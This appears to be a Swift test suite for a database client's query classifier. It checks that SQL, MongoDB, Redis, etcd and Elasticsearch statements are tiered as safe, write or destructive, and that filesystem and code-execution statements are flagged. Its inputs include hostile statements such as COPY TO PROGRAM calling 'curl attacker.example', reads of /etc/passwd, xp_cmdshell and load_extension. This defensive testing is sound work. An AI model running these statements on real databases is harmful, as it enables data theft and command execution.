//
//  QueryClassifierHardeningTests.swift
//  TableProTests
//

import Foundation
@testable import TablePro
import Testing

@Suite("QueryClassifier fails closed")
struct QueryClassifierFailClosedTests {
    @Test("Statements the keyword table does not know are treated as writes")
    func unknownKeywordIsWrite() {
        let unknown = [
            "SOMETHING_NEW users",
            "FROBNICATE TABLE users",
            "ZZZ",
            "GRAPH TRAVERSE users",
            "PLUGIN_DO_THING()"
        ]
        for statement in unknown {
            #expect(
                QueryClassifier.classifyTier(statement, databaseType: .postgresql) == .write,
                "\(statement) must fail closed as a write"
            )
        }
        #expect(QueryClassifier.classifyTier("BATCH APPLY", databaseType: .cassandra) == .write)
    }

    @Test("DO runs arbitrary server-side code, so it is a write that reaches code execution")
    func doBlockIsNeverSafe() {
        let block = "DO $$ BEGIN DELETE FROM users; END $$"
        #expect(QueryClassifier.classifyTier(block, databaseType: .postgresql) == .write)
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(block, databaseType: .postgresql))
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(
            "do $$ begin perform 1; end $$",
            databaseType: .postgresql
        ))
    }

    @Test("COPY reaches the filesystem in both directions and TO PROGRAM executes code")
    func copyIsNeverSafe() {
        let statements = [
            "COPY users TO PROGRAM 'curl attacker.example'",
            "COPY users FROM PROGRAM 'cat /etc/passwd'",
            "COPY users FROM '/etc/passwd'",
            "COPY users TO '/tmp/leak.csv'",
            "COPY users FROM STDIN"
        ]
        for statement in statements {
            #expect(
                QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .postgresql),
                "\(statement) must be flagged as reaching the filesystem or running code"
            )
            #expect(QueryClassifier.isWriteQuery(statement, databaseType: .postgresql))
        }
    }

    @Test("Each keyword the old allowlist missed now classifies as a write")
    func keywordsTheAllowlistMissed() {
        let writes: [String: String] = [
            "DO": "DO $$ BEGIN PERFORM 1; END $$",
            "COPY": "COPY users FROM '/tmp/in.csv'",
            "ATTACH": "ATTACH DATABASE '/tmp/evil.db' AS evil",
            "VACUUM": "VACUUM FULL users",
            "SET": "SET search_path TO public",
            "LOCK": "LOCK TABLE users IN EXCLUSIVE MODE",
            "COMMENT": "COMMENT ON TABLE users IS 'x'",
            "REFRESH": "REFRESH MATERIALIZED VIEW report",
            "REINDEX": "REINDEX TABLE users",
            "CLUSTER": "CLUSTER users USING users_pkey",
            "PREPARE": "PREPARE plan AS SELECT 1",
            "INSTALL": "INSTALL httpfs"
        ]
        for (keyword, statement) in writes {
            #expect(
                QueryClassifier.isWriteQuery(statement, databaseType: .postgresql),
                "\(keyword) must classify as a write"
            )
        }
    }

    @Test("Transaction control is a write, not a read")
    func transactionControlIsAWrite() {
        for statement in ["BEGIN", "START TRANSACTION", "COMMIT", "ROLLBACK", "SAVEPOINT a", "RELEASE a"] {
            #expect(
                QueryClassifier.isWriteQuery(statement, databaseType: .postgresql),
                "\(statement) must classify as a write"
            )
        }
    }

    @Test("Filesystem and code-execution markers are flagged wherever they appear")
    func filesystemAndCodeExecutionMarkers() {
        let flagged = [
            "SELECT * FROM users INTO OUTFILE '/tmp/out'",
            "SELECT * FROM users INTO DUMPFILE '/tmp/out'",
            "VACUUM INTO '/tmp/copy.db'",
            "SELECT load_file('/etc/passwd')",
            "SELECT pg_read_file('/etc/passwd')",
            "SELECT pg_ls_dir('/')",
            "SELECT lo_export(1, '/tmp/x')",
            "SELECT readfile('/etc/passwd')",
            "SELECT load_extension('/tmp/evil.dylib')",
            "EXEC xp_cmdshell 'dir'",
            "DECLARE @o INT; EXEC sp_OACreate 'x', @o OUT"
        ]
        for statement in flagged {
            #expect(
                QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .postgresql),
                "\(statement) must be flagged"
            )
            #expect(QueryClassifier.isWriteQuery(statement, databaseType: .postgresql))
        }
    }

    @Test("LOAD DATA INFILE reaches the filesystem")
    func loadDataInfileIsFlagged() {
        let statement = "LOAD DATA INFILE '/etc/passwd' INTO TABLE staging"
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .mysql))
        #expect(QueryClassifier.isWriteQuery(statement, databaseType: .mysql))
    }

    @Test("Ordinary reads stay safe and never claim to reach the filesystem")
    func readsStaySafe() {
        let reads = [
            "SELECT * FROM users",
            "WITH t AS (SELECT 1) SELECT * FROM t",
            "SHOW TABLES",
            "DESCRIBE users",
            "DESC users",
            "EXPLAIN SELECT * FROM users",
            "EXPLAIN ANALYZE SELECT * FROM users",
            "TABLE users",
            "VALUES (1)",
            "SELECT * FROM dropped_items",
            "SELECT * FROM insert_log"
        ]
        for statement in reads {
            #expect(
                !QueryClassifier.isWriteQuery(statement, databaseType: .postgresql),
                "\(statement) must stay safe"
            )
            #expect(!QueryClassifier.reachesFilesystemOrExecutesCode(statement, databaseType: .postgresql))
        }
    }

    @Test("An empty or comment-only statement is safe because it runs nothing")
    func emptyStatementIsSafe() {
        #expect(QueryClassifier.classifyTier("", databaseType: .postgresql) == .safe)
        #expect(QueryClassifier.classifyTier("   \n\t ", databaseType: .postgresql) == .safe)
        #expect(QueryClassifier.classifyTier("-- just a note", databaseType: .postgresql) == .safe)
    }

    @Test("A leading comment never hides the real keyword")
    func leadingCommentsDoNotHideTheKeyword() {
        #expect(
            QueryClassifier.classifyTier("-- harmless\nDROP TABLE users", databaseType: .postgresql)
                == .destructive
        )
        #expect(
            QueryClassifier.classifyTier("/* SELECT */ DROP TABLE users", databaseType: .postgresql)
                == .destructive
        )
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "/* fine */ DO $$ BEGIN PERFORM 1; END $$",
                databaseType: .postgresql
            )
        )
    }

    @Test("EXPLAIN ANALYZE of a write executes the write")
    func explainAnalyzeInheritsInnerTier() {
        #expect(QueryClassifier.isWriteQuery("EXPLAIN ANALYZE DELETE FROM users", databaseType: .postgresql))
        #expect(
            QueryClassifier.classifyTier(
                "EXPLAIN (ANALYZE, BUFFERS) DROP TABLE users",
                databaseType: .postgresql
            ) == .destructive
        )
        #expect(!QueryClassifier.isWriteQuery("EXPLAIN DELETE FROM users", databaseType: .postgresql))
    }

    @Test("DROP and TRUNCATE are destructive, and ALTER is destructive only when it drops")
    func destructiveTiers() {
        #expect(QueryClassifier.classifyTier("DROP TABLE users", databaseType: .postgresql) == .destructive)
        #expect(QueryClassifier.classifyTier("TRUNCATE users", databaseType: .postgresql) == .destructive)
        #expect(
            QueryClassifier.classifyTier("ALTER TABLE users DROP COLUMN email", databaseType: .postgresql)
                == .destructive
        )
        #expect(
            QueryClassifier.classifyTier("ALTER TABLE users ADD COLUMN email TEXT", databaseType: .postgresql)
                == .write
        )
    }

    @Test("A DELETE without WHERE is dangerous, with WHERE it is an ordinary write")
    func unqualifiedDeleteIsDangerous() {
        #expect(QueryClassifier.isDangerousQuery("DELETE FROM users", databaseType: .postgresql))
        #expect(!QueryClassifier.isDangerousQuery("DELETE FROM users WHERE id = 1", databaseType: .postgresql))
        #expect(QueryClassifier.isWriteQuery("DELETE FROM users WHERE id = 1", databaseType: .postgresql))
    }

    @Test("SELECT INTO writes a table even though it starts with SELECT")
    func selectIntoIsAWrite() {
        #expect(
            QueryClassifier.classifyTier("SELECT * INTO backup FROM users", databaseType: .postgresql)
                == .write
        )
    }

    @Test("A common table expression inherits the tier of the statement it hides")
    func commonTableExpressionsInheritTheirTier() {
        #expect(
            QueryClassifier.classifyTier(
                "WITH removed AS (DELETE FROM users RETURNING id) SELECT * FROM removed",
                databaseType: .postgresql
            ) == .write
        )
        #expect(
            QueryClassifier.classifyTier(
                "WITH x AS (SELECT 1) DROP TABLE users",
                databaseType: .postgresql
            ) == .destructive
        )
    }

    @Test("A string literal never triggers a keyword match")
    func literalsAreStripped() {
        #expect(!QueryClassifier.isWriteQuery("SELECT 'drop table users' AS note", databaseType: .postgresql))
        #expect(
            !QueryClassifier.isDangerousQuery(
                "WITH t AS (SELECT 'delete me') SELECT * FROM t",
                databaseType: .postgresql
            )
        )
        #expect(
            !QueryClassifier.isWriteQuery(
                "SELECT * FROM notes WHERE body = 'copy users to program'",
                databaseType: .postgresql
            )
        )
    }

    @Test("Two statements in one string are reported as multi-statement")
    func multiStatementIsDetected() {
        #expect(QueryClassifier.isMultiStatement("SELECT 1; SELECT 2", databaseType: .postgresql))
        #expect(!QueryClassifier.isMultiStatement("SELECT 1", databaseType: .postgresql))
        #expect(!QueryClassifier.isMultiStatement("SELECT 1;", databaseType: .postgresql))
    }
}

@Suite("QueryClassifier non-SQL engines")
struct QueryClassifierNonSqlTests {
    @Test("MongoDB read methods stay safe and writes never look like reads")
    func mongoTiers() {
        #expect(!QueryClassifier.isWriteQuery("db.users.find({a: 1})", databaseType: .mongodb))
        #expect(!QueryClassifier.isWriteQuery("db.users.aggregate([{$match: {a: 1}}])", databaseType: .mongodb))
        #expect(QueryClassifier.isWriteQuery("db.users.insertOne({a: 1})", databaseType: .mongodb))
        #expect(QueryClassifier.isWriteQuery("db.users.updateMany({}, {$set: {a: 1}})", databaseType: .mongodb))
        #expect(QueryClassifier.classifyTier("db.users.deleteMany({})", databaseType: .mongodb) == .destructive)
        #expect(QueryClassifier.classifyTier("db.users.drop()", databaseType: .mongodb) == .destructive)
    }

    @Test("MongoDB server-side JavaScript is flagged even inside a find")
    func mongoCodeExecutionIsFlagged() {
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "db.users.find({$where: 'this.a == 1'})",
                databaseType: .mongodb
            )
        )
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "db.users.aggregate([{$function: {body: 'function(){}'}}])",
                databaseType: .mongodb
            )
        )
    }

    @Test("A MongoDB pipeline that writes through $out or $merge is a write")
    func mongoPipelineWritesAreWrites() {
        #expect(
            QueryClassifier.isWriteQuery("db.users.aggregate([{$out: 'copy'}])", databaseType: .mongodb)
        )
        #expect(
            QueryClassifier.isWriteQuery("db.users.aggregate([{$merge: 'copy'}])", databaseType: .mongodb)
        )
    }

    @Test("An unparsable MongoDB statement fails closed as a write")
    func mongoUnknownFailsClosed() {
        #expect(QueryClassifier.isWriteQuery("runCommand", databaseType: .mongodb))
    }

    @Test("Redis reads come from an allowlist and everything else is a write")
    func redisAllowlist() {
        for command in ["GET key", "HGETALL hash", "LRANGE list 0 -1", "SCAN 0", "TTL key"] {
            #expect(
                !QueryClassifier.isWriteQuery(command, databaseType: .redis),
                "\(command) must stay safe"
            )
        }
        for command in ["SET key value", "DEL key", "HSET hash field value", "SOME.UNKNOWN.COMMAND"] {
            #expect(
                QueryClassifier.isWriteQuery(command, databaseType: .redis),
                "\(command) must classify as a write"
            )
        }
    }

    @Test("Redis scripting and persistence commands are flagged as code or filesystem")
    func redisUnsafeSurfaces() {
        for command in ["EVAL \"return 1\" 0", "EVALSHA abc 0", "FUNCTION LOAD x", "SCRIPT LOAD x", "SAVE"] {
            #expect(
                QueryClassifier.reachesFilesystemOrExecutesCode(command, databaseType: .redis),
                "\(command) must be flagged"
            )
        }
        #expect(QueryClassifier.classifyTier("FLUSHALL", databaseType: .redis) == .destructive)
        #expect(QueryClassifier.classifyTier("DEBUG SEGFAULT", databaseType: .redis) == .destructive)
    }

    @Test("Redis CONFIG splits on the subcommand")
    func redisConfigSplitsOnSubcommand() {
        #expect(QueryClassifier.classifyTier("CONFIG GET maxmemory", databaseType: .redis) == .safe)
        #expect(QueryClassifier.classifyTier("CONFIG SET maxmemory 100", databaseType: .redis) == .destructive)
    }

    @Test("etcd verbs separate reads, writes, deletes and snapshots")
    func etcdTiers() {
        #expect(!QueryClassifier.isWriteQuery("get /keys", databaseType: .etcd))
        #expect(!QueryClassifier.isWriteQuery("watch /keys", databaseType: .etcd))
        #expect(QueryClassifier.isWriteQuery("put /keys value", databaseType: .etcd))
        #expect(QueryClassifier.classifyTier("del /keys", databaseType: .etcd) == .destructive)
        #expect(QueryClassifier.classifyTier("compact 5", databaseType: .etcd) == .destructive)
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode("snapshot save backup.db", databaseType: .etcd))
    }

    @Test("Elasticsearch separates read verbs from writes and deletes")
    func elasticsearchTiers() {
        #expect(!QueryClassifier.isWriteQuery("GET /index/_search", databaseType: .elasticsearch))
        #expect(!QueryClassifier.isWriteQuery("POST /index/_search {}", databaseType: .elasticsearch))
        #expect(QueryClassifier.isWriteQuery("PUT /index/_doc/1", databaseType: .elasticsearch))
        #expect(QueryClassifier.isWriteQuery("POST /index/_doc", databaseType: .elasticsearch))
        #expect(QueryClassifier.classifyTier("DELETE /index", databaseType: .elasticsearch) == .destructive)
    }

    @Test("Elasticsearch stored scripts are flagged as code execution on both verbs")
    func elasticsearchScriptsAreFlagged() {
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode("GET /_scripts/evil", databaseType: .elasticsearch)
        )
        #expect(
            QueryClassifier.reachesFilesystemOrExecutesCode(
                "POST /_scripts/painless/_execute",
                databaseType: .elasticsearch
            )
        )
    }
}
